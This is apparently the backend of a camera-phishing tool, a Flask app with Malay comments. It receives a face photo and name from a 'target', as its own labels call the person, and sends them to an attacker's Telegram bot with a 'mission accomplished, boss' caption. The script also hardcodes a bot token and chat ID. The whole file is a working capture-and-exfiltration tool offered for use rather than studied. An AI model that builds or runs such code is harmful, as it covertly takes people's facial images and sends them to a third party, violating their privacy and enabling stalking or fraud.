from flask import Flask, request, jsonify, render_template
import requests

app = Flask(__name__)

# --- KONFIGURASI TELEGRAM ---
BOT_TOKEN = '8693473342:AAFxxYuq6B-0h8VzRiIckLr0NaFiw38qvsE'
CHAT_ID = '7707379903'
# ----------------------------

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload_capture', methods=['POST'])
def upload_capture():
    if 'image' not in request.files:
        return jsonify({"status": "error"}), 400
    
    file = request.files['image']
    name = request.form.get('username', 'Sasaran Misteri')
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    
    try:
        # PERBAIKAN DI SINI: Baca fail sebagai byte supaya requests boleh hantar
        img_bytes = file.read()
        files = {'photo': ('face.jpg', img_bytes, 'image/jpeg')}
        data = {'chat_id': CHAT_ID, 'caption': f"📸 TANGKAPAN MUKA BERJAYA!\n👤 Info: {name}\n🎯 Misi Berhasil, Boss!"}
        
        response = requests.post(url, data=data, files=files)
        if response.status_code == 200:
            return jsonify({"status": "success"}), 200
        else:
            print(f"Telegram API Error: {response.text}")
    except Exception as e:
        print(f"Error: {e}")
        
    return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)
